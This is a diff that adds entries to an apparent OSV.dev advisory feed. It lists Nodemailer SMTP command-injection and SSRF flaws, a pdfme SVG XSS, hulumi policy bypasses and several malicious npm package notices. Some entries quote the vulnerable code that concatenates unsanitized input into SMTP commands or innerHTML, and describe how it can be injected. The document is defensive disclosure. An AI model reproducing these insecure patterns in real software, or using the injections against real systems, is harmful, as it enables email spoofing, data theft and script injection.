+// packages/common/src/helpe…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/pdfme/pdfme/security/advisories/GHSA-pgx6-7jcq-2qff"&gt;https://github.com/pdfme/pdfme/security/advisories/GHSA-pgx6-7jcq-2qff&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/pdfme/pdfme"&gt;https://github.com/pdfme/pdfme&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-pgx6-7jcq-2qff"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[UPDATED] GHSA-vvjj-xcjg-gr5g: Nodemailer Vulnerable to SMTP Command Injection via CRLF in Transport name Option (EHLO/HELO) </title>
+    <id>https://osv.dev/vulnerability/GHSA-vvjj-xcjg-gr5g</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-vvjj-xcjg-gr5g"/>
+    <published>2026-04-08T15:05:20Z</published>
+    <updated>2026-09-01T03:55:42Z</updated>
+    <category term="npm"/>
+    <category term="CVE-2026-82853"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Nodemailer Vulnerable to SMTP Command Injection via CRLF in Transport name Option (EHLO/HELO) &lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-82853&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:H/A:N&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;nodemailer&lt;/code&gt; — fixed in 8.0.5&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;### Summary
+
+Nodemailer versions up to and including 8.0.4 are vulnerable to SMTP command injection via CRLF sequences in the transport `name` configuration option. The `name` value is used directly in the EHLO/HELO SMTP command without any sanitization for carriage return and line feed characters (`\r\n`). An attacker who can influence this option can inject arbitrary SMTP commands, enabling unauthorized email sending, email spoofing, and phishing attacks.
+
+### Details
+
+The vulnerability exists in `lib/smtp-connection/index.js`. When establishing an SMTP connection, the `name` option is concatenated directly into the EHLO command:
+
+```javascript
+// lib/smtp-connection/index.js, line 71
+this.name = this.options.name || this._getHostname();
+
+// line 1336
+this._sendCommand(&amp;#x27;EHLO &amp;#x27; + this.nam…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/nodemailer/nodemailer/security/advisories/GHSA-vvjj-xcjg-gr5g"&gt;https://github.com/nodemailer/nodemailer/security/advisories/GHSA-vvjj-xcjg-gr5g&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/nodemailer/nodemailer/commit/0a43876801a420ca528f492eaa01bfc421cc306e"&gt;https://github.com/nodemailer/nodemailer/commit/0a43876801a420ca528f492eaa01bfc421cc306e&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/nodemailer/nodemailer"&gt;https://github.com/nodemailer/nodemailer&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/nodemailer/nodemailer/releases/tag/v8.0.5"&gt;https://github.com/nodemailer/nodemailer/releases/tag/v8.0.5&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-vvjj-xcjg-gr5g"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[UPDATED] GHSA-c7w3-x93f-qmm8: Nodemailer has SMTP command injection due to unsanitized `envelope.size` parameter</title>
+    <id>https://osv.dev/vulnerability/GHSA-c7w3-x93f-qmm8</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-c7w3-x93f-qmm8"/>
+    <published>2026-03-26T22:26:46Z</published>
+    <updated>2026-09-01T03:55:42Z</updated>
+    <category term="npm"/>
+    <category term="CVE-2026-82854"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Nodemailer has SMTP command injection due to unsanitized `envelope.size` parameter&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-82854&lt;/p&gt;&lt;p&gt;Severity: CVSS_V4: CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;nodemailer&lt;/code&gt; — fixed in 8.0.4&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;### Summary
+When a custom `envelope` object is passed to `sendMail()` with a `size` property containing CRLF characters (`\r\n`), the value is concatenated directly into the SMTP `MAIL FROM` command without sanitization. This allows injection of arbitrary SMTP commands, including `RCPT TO` — silently adding attacker-controlled recipients to outgoing emails.
+
+
+### Details
+In `lib/smtp-connection/index.js` (lines 1161-1162), the `envelope.size` value is concatenated into the SMTP `MAIL FROM` command without any CRLF sanitization:
+
+```javascript
+if (this._envelope.size &amp;amp;&amp;amp; this._supportedExtensions.includes(&amp;#x27;SIZE&amp;#x27;)) {
+    args.push(&amp;#x27;SIZE=&amp;#x27; + this._envelope.size);
+}
+```
+
+This contrasts with other envelope parameters in the same function that ARE properly sanitized:
+- **Addresses** (`from`, `to`…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/nodemailer/nodemailer/security/advisories/GHSA-c7w3-x93f-qmm8"&gt;https://github.com/nodemailer/nodemailer/security/advisories/GHSA-c7w3-x93f-qmm8&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/nodemailer/nodemailer/commit/2d7b9710e63555a1eb13d721296c51186d4b5651"&gt;https://github.com/nodemailer/nodemailer/commit/2d7b9710e63555a1eb13d721296c51186d4b5651&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/nodemailer/nodemailer"&gt;https://github.com/nodemailer/nodemailer&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-c7w3-x93f-qmm8"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[UPDATED] GHSA-g43v-9x7q-83pq: @hulumi/policies: HULUMI-H1 SecureBucket parent spoof bypass</title>
+    <id>https://osv.dev/vulnerability/GHSA-g43v-9x7q-83pq</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-g43v-9x7q-83pq"/>
+    <published>2026-05-21T20:43:58Z</published>
+    <updated>2026-09-01T03:55:41Z</updated>
+    <category term="npm"/>
+    <category term="CVE-2026-82861"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;@hulumi/policies: HULUMI-H1 SecureBucket parent spoof bypass&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-82861&lt;/p&gt;&lt;p&gt;Severity: CVSS_V4: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@hulumi/policies&lt;/code&gt; — fixed in 1.3.2&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Impact: @hulumi/policies versions before 1.3.2 could accept spoofed SecureBucket parent evidence for HULUMI-H1, allowing policy evaluation to miss an unsafe bucket shape.
+
+Patched in 1.3.2: the validator now correlates evidence to the expected component/resource relationship and includes regression coverage.
+
+Remediation: upgrade @hulumi/policies to 1.3.2 or later.&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/kerberosmansour/hulumi/security/advisories/GHSA-g43v-9x7q-83pq"&gt;https://github.com/kerberosmansour/hulumi/security/advisories/GHSA-g43v-9x7q-83pq&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/kerberosmansour/hulumi"&gt;https://github.com/kerberosmansour/hulumi&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-g43v-9x7q-83pq"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[UPDATED] GHSA-2ffm-hxrq-qqmm: @hulumi/drift: Orphan reconciler accepted externally supplied execute plans</title>
+    <id>https://osv.dev/vulnerability/GHSA-2ffm-hxrq-qqmm</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-2ffm-hxrq-qqmm"/>
+    <published>2026-05-21T20:43:41Z</published>
+    <updated>2026-09-01T03:55:41Z</updated>
+    <category term="npm"/>
+    <category term="CVE-2026-82858"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;@hulumi/drift: Orphan reconciler accepted externally supplied execute plans&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-82858&lt;/p&gt;&lt;p&gt;Severity: CVSS_V4: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@hulumi/drift&lt;/code&gt; — fixed in 1.3.2&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Impact: @hulumi/drift versions before 1.3.2 could accept externally supplied execute plans without sufficient provenance checks, allowing unsafe reconciliation input to be treated as trusted.
+
+Patched in 1.3.2: execute-plan handling now validates provenance and rejects untrusted plans, with regression coverage.
+
+Remediation: upgrade @hulumi/drift to 1.3.2 or later.&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/kerberosmansour/hulumi/security/advisories/GHSA-2ffm-hxrq-qqmm"&gt;https://github.com/kerberosmansour/hulumi/security/advisories/GHSA-2ffm-hxrq-qqmm&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/kerberosmansour/hulumi"&gt;https://github.com/kerberosmansour/hulumi&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-2ffm-hxrq-qqmm"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[UPDATED] GHSA-p6gq-j5cr-w38f: Nodemailer: Message-level raw option bypasses disableFileAccess/disableUrlAccess, enabling arbitrary file read and full-response SSRF in the delivered message</title>
+    <id>https://osv.dev/vulnerability/GHSA-p6gq-j5cr-w38f</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-p6gq-j5cr-w38f"/>
+    <published>2026-06-18T14:28:05Z</published>
+    <updated>2026-09-01T03:55:41Z</updated>
+    <category term="npm"/>
+    <category term="CVE-2026-82659"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Nodemailer: Message-level raw option bypasses disableFileAccess/disableUrlAccess, enabling arbitrary file read and full-response SSRF in the delivered message&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-82659&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;nodemailer&lt;/code&gt; — fixed in 9.0.1&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;# Message-level `raw` option bypasses `disableFileAccess` / `disableUrlAccess`, enabling arbitrary file read and full-response SSRF in the sent message
+
+- **Target:** nodemailer/nodemailer, npm `nodemailer` **v9.0.0** (HEAD `4e58450eb490e5097a74b2b2cce35a8d9e21856e`)
+- **Verdict:** CONFIRMED (local PoC, no network)
+
+## Summary
+
+Nodemailer exposes `disableFileAccess` and `disableUrlAccess` so an application that passes
+**untrusted** message data to the library can forbid that data from reading local files or
+fetching URLs. Every attachment, alternative, `html`/`text`/`watchHtml`/`amp` and `icalEvent`
+content node honors these flags. **The message-level `raw` option does not.**
+
+`MailComposer.compile()` builds the root MIME node for a `raw` message **without** threading the
+two flags, so a `…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/nodemailer/nodemailer/security/advisories/GHSA-p6gq-j5cr-w38f"&gt;https://github.com/nodemailer/nodemailer/security/advisories/GHSA-p6gq-j5cr-w38f&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/nodemailer/nodemailer"&gt;https://github.com/nodemailer/nodemailer&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-p6gq-j5cr-w38f"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[UPDATED] GHSA-gfp8-mp24-5vxg: @hulumi/baseline: CloudTrail selector tampering events were not fully detected</title>
+    <id>https://osv.dev/vulnerability/GHSA-gfp8-mp24-5vxg</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-gfp8-mp24-5vxg"/>
+    <published>2026-05-21T20:43:27Z</published>
+    <updated>2026-09-01T03:55:41Z</updated>
+    <category term="npm"/>
+    <category term="CVE-2026-82863"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;@hulumi/baseline: CloudTrail selector tampering events were not fully detected&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-82863&lt;/p&gt;&lt;p&gt;Severity: CVSS_V4: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@hulumi/baseline&lt;/code&gt; — fixed in 1.3.2&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Impact: @hulumi/baseline versions before 1.3.2 could miss some CloudTrail event-selector tampering evidence, reducing coverage for changes to audit logging configuration.
+
+Patched in 1.3.2: detection coverage and regression tests were expanded.
+
+Remediation: upgrade @hulumi/baseline to 1.3.2 or later and rerun affected previews/checks.&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/kerberosmansour/hulumi/security/advisories/GHSA-gfp8-mp24-5vxg"&gt;https://github.com/kerberosmansour/hulumi/security/advisories/GHSA-gfp8-mp24-5vxg&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/kerberosmansour/hulumi"&gt;https://github.com/kerberosmansour/hulumi&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-gfp8-mp24-5vxg"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[UPDATED] GHSA-87v3-4cfp-cm76: Cross-Site Scripting (XSS) via SVG Schema innerHTML Injection in @pdfme/schemas</title>
+    <id>https://osv.dev/vulnerability/GHSA-87v3-4cfp-cm76</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-87v3-4cfp-cm76"/>
+    <published>2026-03-18T16:10:26Z</published>
+    <updated>2026-09-01T03:55:41Z</updated>
+    <category term="npm"/>
+    <category term="CVE-2026-82868"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Cross-Site Scripting (XSS) via SVG Schema innerHTML Injection in @pdfme/schemas&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-82868&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@pdfme/schemas&lt;/code&gt; — fixed in 5.5.9&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;## Summary
+
+The SVG schema plugin in `@pdfme/schemas` renders user-supplied SVG content using `container.innerHTML = value` without any sanitization, enabling arbitrary JavaScript execution in the user&amp;#x27;s browser.
+
+## Details
+
+In `packages/schemas/src/graphics/svg.ts`, line 87, the SVG schema&amp;#x27;s `ui` renderer assigns raw SVG markup directly to `innerHTML` when in viewer mode or form mode with `readOnly: true`:
+
+```typescript
+// svg.ts, line 81-94 (non-editable rendering path)
+} else {
+  if (!value) return;
+  if (!isValidSVG(value)) {
+    rootElement.appendChild(createErrorElm());
+    return;
+  }
+  container.innerHTML = value;  // &amp;lt;-- VULNERABLE: unsanitized SVG injected into DOM
+  const svgElement = container.childNodes[0];
+  if (svgElement instanceof SVGElement) {
+    svgElement.setAttribut…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/pdfme/pdfme/security/advisories/GHSA-87v3-4cfp-cm76"&gt;https://github.com/pdfme/pdfme/security/advisories/GHSA-87v3-4cfp-cm76&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/pdfme/pdfme"&gt;https://github.com/pdfme/pdfme&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-87v3-4cfp-cm76"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-15654: Malicious code in @yane88/idea-2026.2-04 (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-15654</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-15654"/>
+    <published>2026-09-01T02:29:06Z</published>
+    <updated>2026-09-01T03:45:15Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-xpjx-pwwq-qg46"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @yane88/idea-2026.2-04 (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-xpjx-pwwq-qg46&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@yane88/idea-2026.2-04&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: ghsa-malware (a563932a890cd09abfabb1a2fb37bba82cf507c0f0fab92ecbebc39689185654)
+Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
+&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-xpjx-pwwq-qg46"&gt;https://github.com/advisories/GHSA-xpjx-pwwq-qg46&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-15654"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-15660: Malicious code in @yane88/ripgrep-win (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-15660</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-15660"/>
+    <published>2026-09-01T02:29:07Z</published>
+    <updated>2026-09-01T03:45:15Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-274r-44qv-6xwc"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @yane88/ripgrep-win (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-274r-44qv-6xwc&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@yane88/ripgrep-win&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: ghsa-malware (c09d2a7b42fb9d603ab4b8d0a2afedab22f28e00295c870c4f140ef7dbec78ad)
+Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
+&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-274r-44qv-6xwc"&gt;https://github.com/advisories/GHSA-274r-44qv-6xwc&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-15660"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-15662: Malicious code in @yane88/term-reqable-01 (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-15662</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-15662"/>
+    <published>2026-09-01T02:29:07Z</published>
+    <updated>2026-09-01T03:45:15Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-m76v-4h4c-w693"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @yane88/term-reqable-01 (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-m76v-4h4c-w693&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@yane88/term-reqable-01&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: ghsa-malware (8dd1d25c85b0febc391c9ca33af1d4bbbec959413342470f159562f40ed9bd07)
+Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
+&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-m76v-4h4c-w693"&gt;https://github.com/advisories/GHSA-m76v-4h4c-w693&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-15662"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-15671: Malicious code in quartz-core (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-15671</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-15671"/>
+    <published>2026-09-01T01:03:21Z</published>
+    <updated>2026-09-01T03:45:15Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-w63g-6crc-rq2w"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in quartz-core (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-w63g-6crc-rq2w&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;quartz-core&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: ghsa-malware (f2f763d82e760eded4c7415a92f07bf478beeee2ac94ee8e8af73292194b7f42)
+Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
+&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-w63g-6crc-rq2w"&gt;https://github.com/advisories/GHSA-w63g-6crc-rq2w&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-15671"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-15672: Malicious code in randomunblockedwebsite (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-15672</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-15672"/>
+    <published>2026-09-01T01:51:36Z</published>
+    <updated>2026-09-01T03:45:15Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-5x4x-f7h5-6p47"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in randomunblockedwebsite (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-5x4x-f7h5-6p47&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;randomunblockedwebsite&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: ghsa-malware (f7848bbfd3cedf612cbe209569efaae365d80739016596d926aff2c216134168)
+Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
+&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-5x4x-f7h5-6p47"&gt;https://github.com/advisories/GHSA-5x4x-f7h5-6p47&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-15672"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-15653: Malicious code in @yane88/idea-2026.2-03 (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-15653</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-15653"/>
+    <published>2026-09-01T02:29:06Z</published>
+    <updated>2026-09-01T03:45:15Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-fw5q-2vvv-w862"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @yane88/idea-2026.2-03 (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-fw5q-2vvv-w862&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@yane88/idea-2026.2-03&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: ghsa-malware (e4bbffafc80ade5920ccb99c8c2185ff64f148bb176c6ea33417aa12fc0e52b9)
+Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
+&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-fw5q-2vvv-w862"&gt;https://github.com/advisories/GHSA-fw5q-2vvv-w862&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-15653"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-15664: Malicious code in @yane88/workbuddy (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-15664</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-15664"/>
+    <published>2026-09-01T02:29:07Z</published>
+    <updated>2026-09-01T03:45:14Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-v22h-4j6c-58cm"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @yane88/workbuddy (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-v22h-4j6c-58cm&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@yane88/workbuddy&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: ghsa-malware (4375d4bea3b8be81239cf8af942cafe012039acfc57c4191ff3bcd639b5d1508)
+Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
+&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-v22h-4j6c-58cm"&gt;https://github.com/advisories/GHSA-v22h-4j6c-58cm&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-15664"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-15670: Malicious code in matrix-by-lmx (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-15670</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-15670"/>
+    <published>2026-09-01T01:51:59Z</published>
